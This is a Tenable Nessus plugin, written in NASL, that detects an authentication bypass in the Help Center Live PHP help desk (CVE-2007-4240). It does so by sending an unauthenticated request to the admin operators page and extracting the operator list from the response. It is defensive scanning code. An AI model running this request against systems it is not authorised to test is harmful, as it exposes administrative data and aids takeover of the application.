#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25898);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2007-4240");
  script_bugtraq_id(25225);
  script_osvdb_id(39400);

  script_name(english:"Help Center Live class/auth.php check_logout Function Admin Authentication Bypass");
  script_summary(english:"Tries to get a list of all operators");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
authentication bypass issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Help Center Live, an open source, web-based
help desk application written in PHP. 

The version of Help Center Live installed on the remote host has
several administrative scripts that fail to exit if called without
valid credentials.  An unauthenticated attacker may be able to exploit
this design flaw to gain administrative control of the application." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/08/16");
 script_cvs_date("$Date: 2016/05/11 13:32:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:help_center_live:help_center_live");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/helpcenterlive", "/hcl", "/helpcenter", "/live", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to get a list of operators.
  r = http_send_recv3(method:"GET", item:string(dir, "/admin/operators.php?view"), port:port);
  if (isnull(r)) exit(0);

  # If...
  if (
    # we got a list of operators and...
    "<h2>Operators</h2>" >< r[2] &&
    # we're redirected to the login page
    egrep(pattern:string("^Location: .+", dir, "/admin/index.php"), string:r[1])
  )
  {
    # Grab the list of operators for the report.
    operators = "";
    table = strstr(r[2], "<h2>Operators</h2>");
    table = table - strstr(table, "</table");

    pat = "<td>.+\(([^)]+)\)</td";
    matches = egrep(pattern:pat, string:table);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item)) operators += '  ' + item[1] + '\n';
      }
    }

    if (operators)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue to obtain the following list of\n",
        "operators on the remote host :\n",
        "\n",
        operators
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
